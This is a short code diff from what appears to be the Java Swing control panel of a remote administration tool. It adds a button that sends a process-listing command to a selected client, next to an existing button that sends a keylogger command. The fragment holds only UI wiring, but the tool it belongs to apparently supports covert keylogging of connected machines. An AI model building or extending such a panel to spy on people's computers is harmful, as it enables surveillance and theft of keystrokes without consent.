@@ -167,6 +167,13 @@ public class index extends JFrame {
                 admin.onHandle(COMMAND_KEYLOGGER);
             }
         });
+        this.btn_process.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                if (currentClientId == null) return;
+                admin.onHandle(COMMAND_PROCESS);
+            }
+        });
         this.toggle_usage.addItemListener(new ItemListener() {
             public void itemStateChanged(ItemEvent e) {
                 if (toggle_usage.isSelected()) {
